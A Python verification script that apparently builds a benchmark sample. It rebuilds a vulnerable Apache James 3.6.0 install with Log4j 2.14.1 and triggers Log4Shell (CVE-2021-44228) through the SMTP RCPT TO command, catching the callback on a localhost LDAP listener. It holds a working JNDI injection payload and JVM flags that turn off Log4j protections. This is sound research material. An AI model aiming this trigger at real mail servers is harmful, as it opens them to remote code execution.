#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_james_3_6_0_v1_log4j_real_entrypoint"
ARCHIVE_NAME = "james-server-app-3.6.0-app.zip"
ARCHIVE_URL = "https://archive.apache.org/dist/james/server/3.6.0/james-server-app-3.6.0-app.zip"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
V1_RUNTIME_TARGETS = {"log4j-api-2.14.0.jar", "log4j-core-2.14.0.jar"}
LOG4J_JARS = {
    "log4j-api-2.14.0.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.0.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(dist):
    lib = dist / "lib"
    before = sorted(p.name for p in lib.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        target = lib / target_name
        if target.exists():
            target.unlink()
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_TARGETS,
            "target_filename_preserved_for_downstream_classpath": True,
        }
    after = sorted(p.name for p in lib.glob("log4j-*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(lib / "log4j-core-2.14.0.jar"),
    }


def free_port(host="127.0.0.1"):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((host, 0))
        return sock.getsockname()[1]


def ensure_james(probe_dir, log_path):
    archive = ARCHIVE
    if not archive.exists() or archive.stat().st_size < 80_000_000:
        import urllib.request

        archive.parent.mkdir(parents=True, exist_ok=True)
        with log_path.open("a", encoding="utf-8") as log:
            log.write(f"Downloading {ARCHIVE_URL}\n")
        tmp = archive.with_suffix(".zip.tmp")
        urllib.request.urlretrieve(ARCHIVE_URL, tmp)
        tmp.rename(archive)

    dist = probe_dir / "james-server-app-3.6.0"
    if dist.exists():
        shutil.rmtree(dist)
    with zipfile.ZipFile(archive) as zf:
        zf.extractall(probe_dir)
    return archive, dist, replace_log4j(dist)


def dependency_evidence(dist, evidence_dir, replacement):
    jars = sorted(str(p.relative_to(dist)) for p in dist.glob("lib/log4j-*.jar"))
    result = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache James Server App 3.6.0 "
            "binary with generated v1 Log4j 2.14.1 api/core jar bytes copied from .m2-poc "
            "into the original James log4j-api/core 2.14.0 target filenames; James' original "
            "2.14.0 log4j-slf4j-impl bridge is retained"
        ),
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": jars,
        "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
        "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
    }
    (evidence_dir / "dependency-evidence.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "dependency-evidence.txt").write_text(
        "\n".join(jars)
        + f"\nJndiLookup.class={result['jndi_lookup_class_present']}\n"
        + f"JndiManager.class={result['jndi_manager_class_present']}\n",
        encoding="utf-8",
    )
    return result


def start_listener(evidence_dir, case_name, timeout=25):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(str(port_box["port"]), encoding="utf-8")
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} listener did not start")
    return port_box["port"], received, thread


def stop_process(proc):
    if proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        proc.wait(timeout=10)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=5)
        except Exception:
            pass


def replace_bind(path, port):
    text = path.read_text(encoding="utf-8")
    text = re.sub(r"<bind>[^<]+</bind>", f"<bind>127.0.0.1:{port}</bind>", text, count=1)
    path.write_text(text, encoding="utf-8")


def prepare_run_dir(dist, evidence_dir, case_name, smtp_port):
    run_dir = evidence_dir / f"{case_name}-dist"
    if run_dir.exists():
        shutil.rmtree(run_dir)
    shutil.copytree(dist, run_dir)
    for script in (run_dir / "bin").glob("*.sh"):
        script.chmod(script.stat().st_mode | 0o111)
    replace_bind(run_dir / "conf" / "smtpserver.xml", smtp_port)
    # Avoid privileged/default ports and keep unrelated protocol startup from blocking the probe.
    replace_bind(run_dir / "conf" / "imapserver.xml", free_port())
    replace_bind(run_dir / "conf" / "pop3server.xml", free_port())
    replace_bind(run_dir / "conf" / "lmtpserver.xml", free_port())
    replace_bind(run_dir / "conf" / "managesieveserver.xml", free_port())
    return run_dir


def read_line(sock):
    data = b""
    sock.settimeout(3)
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data.decode("latin1", errors="replace")


def smtp_dialog(port, recipient_value):
    transcript = []
    with socket.create_connection(("127.0.0.1", port), timeout=5) as sock:
        transcript.append(read_line(sock))
        for cmd in [
            "HELO localhost\r\n",
            "MAIL FROM:<sender@localhost>\r\n",
            f"RCPT TO:{recipient_value}\r\n",
            "QUIT\r\n",
        ]:
            sock.sendall(cmd.encode("ascii"))
            transcript.append(cmd.strip())
            transcript.append(read_line(sock))
    return transcript


def wait_for_smtp(port, timeout=45):
    deadline = time.time() + timeout
    last_error = None
    while time.time() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=2) as sock:
                line = read_line(sock)
                if line.startswith("220"):
                    sock.sendall(b"QUIT\r\n")
                    return True, None
        except Exception as exc:
            last_error = repr(exc)
        time.sleep(0.5)
    return False, last_error


def run_case(dist, evidence_dir, case_name, with_payload):
    ldap_port, received, listener_thread = start_listener(evidence_dir, case_name)
    smtp_port = free_port()
    run_dir = prepare_run_dir(dist, evidence_dir, case_name, smtp_port)
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % ldap_port
    recipient_value = payload if with_payload else "control"
    cmd = [str(run_dir / "bin" / "run.sh")]
    env = os.environ.copy()
    env["JAVA_TOOL_OPTIONS"] = ""
    env["JAVA_OPTS"] = "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
    started = time.time()
    proc = subprocess.Popen(
        cmd,
        cwd=str(run_dir),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid,
    )
    ready, ready_error = wait_for_smtp(smtp_port)
    transcript = []
    if ready:
        transcript = smtp_dialog(smtp_port, recipient_value)
        time.sleep(4)
    stop_process(proc)
    output = ""
    if proc.stdout:
        try:
            output = proc.stdout.read()
        except Exception:
            pass
    listener_thread.join(5)
    log_hits = []
    for path in sorted((run_dir / "log").rglob("*.log")):
        text = path.read_text(encoding="utf-8", errors="replace")
        if "Error parsing recipient address" in text or payload in text or "control" in text:
            log_hits.append(
                {
                    "file": str(path),
                    "contains_rcpt_parse_log": "Error parsing recipient address" in text,
                    "contains_payload": payload in text if with_payload else False,
                    "contains_control": "control" in text if not with_payload else False,
                    "tail": text[-5000:],
                }
            )
    result = {
        "case": case_name,
        "cmd": cmd,
        "duration_seconds": round(time.time() - started, 3),
        "payload": payload if with_payload else None,
        "smtp_port": smtp_port,
        "smtp_ready": ready,
        "smtp_ready_error": ready_error,
        "recipient_value": recipient_value,
        "smtp_transcript": transcript,
        "returncode": proc.poll(),
        "stdout_tail": output[-8000:],
        "received": received,
        "received_count": len(received),
        "log_hits": log_hits,
        "log_contains_rcpt_parse": any(hit["contains_rcpt_parse_log"] for hit in log_hits),
        "log_contains_payload": any(hit["contains_payload"] for hit in log_hits) if with_payload else False,
        "log_contains_control": any(hit["contains_control"] for hit in log_hits) if not with_payload else False,
    }
    (evidence_dir / f"{case_name}.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and evidence_dir.exists():
        shutil.rmtree(evidence_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    archive, dist, replacement = ensure_james(sample_dir, run_log)
    dep = dependency_evidence(dist, evidence_dir, replacement)
    positive = run_case(dist, evidence_dir, "smtp_rcpt_payload", True)
    negative = run_case(dist, evidence_dir, "smtp_rcpt_control", False)
    confirmed = (
        all(
            name in replacement["copied"]
            and replacement["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_TARGETS
        )
        and replacement["log4j_core"]["version_2_14_1"]
        and dep["jndi_lookup_class_present"]
        and dep["jndi_manager_class_present"]
        and positive["smtp_ready"]
        and positive["log_contains_rcpt_parse"]
        and positive["log_contains_payload"]
        and positive["received_count"] > 0
        and negative["smtp_ready"]
        and negative["log_contains_rcpt_parse"]
        and negative["log_contains_control"]
        and negative["received_count"] == 0
    )
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/james-project",
        "downstream_application": "Apache James Server App 3.6.0",
        "downstream_entrypoint": "bin/run.sh real SMTP service",
        "downstream": "Apache James Server App 3.6.0",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(archive),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "attack_surface": "James SMTP RCPT TO recipient parsing error logged by RcptCmdHandler through Log4j2",
        "payload": positive["payload"],
        "dynamic_signal": {
            "positive_smtp_ready": positive["smtp_ready"],
            "positive_rcpt_parse_log": positive["log_contains_rcpt_parse"],
            "positive_payload_logged": positive["log_contains_payload"],
            "positive_listener_received_count": positive["received_count"],
            "positive_listener_received": positive["received"],
            "negative_smtp_ready": negative["smtp_ready"],
            "negative_rcpt_parse_log": negative["log_contains_rcpt_parse"],
            "negative_control_logged": negative["log_contains_control"],
            "negative_listener_received_count": negative["received_count"],
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_TARGETS),
            "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
            "jndi_manager_class_present": dep["jndi_manager_class_present"],
        },
        "positive": {
            "smtp_ready": positive["smtp_ready"],
            "rcpt_parse_log": positive["log_contains_rcpt_parse"],
            "payload_logged": positive["log_contains_payload"],
            "listener_received_count": positive["received_count"],
            "listener_received": positive["received"],
        },
        "negative": {
            "smtp_ready": negative["smtp_ready"],
            "rcpt_parse_log": negative["log_contains_rcpt_parse"],
            "control_logged": negative["log_contains_control"],
            "listener_received_count": negative["received_count"],
        },
        "cases": [positive, negative],
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_james_log4j_v1_inserted.py"),
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts generated v1 Log4j api/core "
            "2.14.1 runtime jar bytes into an isolated Apache James Server App 3.6.0 distribution "
            "and triggers Log4Shell through James' real SMTP service."
        ),
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_smtp_ready={int(positive['smtp_ready'])}\n"
        f"positive_listener_received_count={positive['received_count']}\n"
        f"negative_listener_received_count={negative['received_count']}\n"
        f"jndi_lookup_class_present={int(dep['jndi_lookup_class_present'])}\n"
        f"jndi_manager_class_present={int(dep['jndi_manager_class_present'])}\n"
        f"positive_rcpt_parse_log={int(positive['log_contains_rcpt_parse'])}\n"
        f"positive_payload_logged={int(positive['log_contains_payload'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache James Server App "
        "3.6.0 binary into an isolated runtime and copies generated v1 Log4j 2.14.1 `api` and `core` "
        "jar bytes from `.m2-poc` into James' original `log4j-api-2.14.0.jar` and "
        "`log4j-core-2.14.0.jar` target filenames, while retaining James' original 2.14.0 Log4j "
        "SLF4J bridge.\n\n"
        "The positive run starts the real `bin/run.sh` SMTP service and sends a malformed `RCPT TO` "
        "value containing `${jndi:ldap://127.0.0.1:<port>/a}`; the negative run uses the same SMTP "
        "path with `control`. Positive must produce one LDAP bind and negative must produce none.\n\n"
        "Run: `python3 scripts/verify_james_log4j_v1_inserted.py` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0 if confirmed else 1


if __name__ == "__main__":
    raise SystemExit(main())
